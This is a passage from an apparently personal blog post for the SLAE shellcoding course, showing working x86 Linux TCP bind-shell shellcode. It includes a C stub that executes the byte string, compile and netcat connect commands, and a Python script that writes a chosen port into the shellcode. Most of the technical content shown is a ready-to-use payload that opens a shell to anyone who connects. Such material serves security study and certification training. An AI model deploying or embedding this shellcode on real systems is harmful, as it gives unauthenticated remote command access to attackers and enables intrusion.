    <span class="s">"</span><span class="se">\x31\xc9\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x51\x57\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x89\xe3\x31\xc9\x31\xd2\xcd\x80</span><span class="s">"</span><span class="p">;</span>
    
    
    <span class="n">main</span><span class="p">()</span>
    <span class="p">{</span>
    
      <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
    
      <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
    
      <span class="n">ret</span><span class="p">();</span>
    
    <span class="p">}</span></code></pre></figure>

<p>Compile with: <code class="highlighter-rouge">gcc shellcode.c -o shellcode</code>
Run with: <code class="highlighter-rouge">./shellcode</code>
Connect with: <code class="highlighter-rouge">nc -nv 127.0.0.1 4444</code></p>

<p>And it works! We get our shell. The shellcode is 122 bytes without
really trying to optimize. We can always go back and try to
optimize. We also need to update the program to make the port number
easily configurable.</p>

<p>Let’s write a wrapper script to set our port. We just accept the port
as a command line argument to our script and interpolate it into our
shellcode and print out the result:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python">    <span class="c">#!/usr/bin/python</span>
    
    <span class="kn">import</span> <span class="nn">sys</span>
    
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
      <span class="k">print</span> <span class="s">"Fail!"</span>
    
    <span class="n">port_number</span>     <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="n">bts</span>             <span class="o">=</span> <span class="p">[</span><span class="n">port_number</span> <span class="o">&gt;&gt;</span> <span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">24</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">0</span><span class="p">)]</span>
    <span class="n">filtered</span>        <span class="o">=</span> <span class="p">[</span><span class="n">b</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">bts</span> <span class="k">if</span> <span class="n">b</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">]</span>
    <span class="n">formatted</span>       <span class="o">=</span> <span class="p">[</span><span class="s">"</span><span class="se">\\</span><span class="s">x"</span> <span class="o">+</span> <span class="n">format</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="s">'x'</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">filtered</span><span class="p">]</span>
    <span class="n">joined</span>          <span class="o">=</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">formatted</span><span class="p">)</span>
    
    <span class="n">shellcode</span> <span class="o">=</span><span class="s">"</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">x51</span><span class="se">\\</span><span class="s">x53</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1"</span>
    <span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xc7</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9"</span>
    <span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x51</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x68"</span> <span class="o">+</span> <span class="n">joined</span> <span class="o">+</span> <span class="s">"</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x53</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x10</span><span class="se">\\</span><span class="s">x51</span><span class="se">\\</span><span class="s">x57"</span>
    <span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x04</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">x51</span><span class="se">\\</span><span class="s">x57"</span>
    <span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x05</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">x51</span><span class="se">\\</span><span class="s">x51"</span>
    <span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x57</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xc3</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">xb1</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x3f</span><span class="se">\\</span><span class="s">xcd"</span>
    <span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x49</span><span class="se">\\</span><span class="s">x79</span><span class="se">\\</span><span class="s">xf9</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x0b</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">x53</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x73</span><span class="se">\\</span><span class="s">x68"</span>
    <span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x62</span><span class="se">\\</span><span class="s">x69</span><span class="se">\\</span><span class="s">x6e</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe3</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xd2</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80"</span>
    
    <span class="k">print</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span></code></pre></figure>

<p>Once we have our script we print out our updated shellcode and pop it back
into our shellcode.c stub program, compile and test a connection. When we do,
we get our shell again. And even better, we can change the port to whatever we
would like to yield the proper shellcode.</p>

          </div>

          <div class="article-share">
            
            <a href="" title="Share on Twitter" onclick="window.open('https://twitter.com/home?status=SLAE Problem 1: TCP Bind Shell Shellcode - http://localhost:4000/posts/slae-problem-1-tcp-bind-shellcode by @blischalk', 'newwindow', 'width=500, height=225'); return false;">
              <span class="icon icon-social-twitter"></span>
            </a>
            <a href="" title="Share on Facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/posts/slae-problem-1-tcp-bind-shellcode', 'newwindow', 'width=500, height=500'); return false;">
              <span class="icon icon-social-facebook"></span>
            </a>
            <a href="" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/posts/slae-problem-1-tcp-bind-shellcode', 'newwindow', 'width=550, height=400'); return false;">
              <span class="icon icon-social-googleplus"></span>
            </a>
          </div>

          <a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional" target="_blank">
            <img src="/assets/offsec-student-certified-emblem-rgb-oscp.png" />
          </a>
          <a href="https://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/" title="Offensive Security Certified Expert" target="_blank">
            <img src="/assets/offsec-student-certified-emblem-rgb-osce.png"" />
          </a>

          
            <div id="disqus_thread" class="article-comments"></div>
            <script>
              (function() {
                  var d = document, s = d.createElement('script');
                  s.src = '//blischalkblog.disqus.com/embed.js';
                  s.setAttribute('data-timestamp', +new Date());
                  (d.head || d.body).appendChild(s);
              })();
            </script>
            <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
          
        </article>
        <footer class="footer reveal">
  <p>
    Site content by: <a href="/about" title="About me">Brett Lischalk</a>.
  </p>
</footer>

      </div>
    </div>
  </main>
  <script type="text/javascript" src="/assets/vendor.js"></script>
<script type="text/javascript" src="/assets/application.js"></script>

<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.16/webfont.js"></script>
<script>
  WebFont.load({
    google: {
      families: ['Cormorant Garamond:700', 'Lato:300,400,700']
    }
  });
</script>


  <script>
    window.ga=function(){ga.q.push(arguments)};ga.q=[];ga.l=+new Date;
    ga('create','UA-4121143-2','auto');ga('send','pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>


</body>
</html>
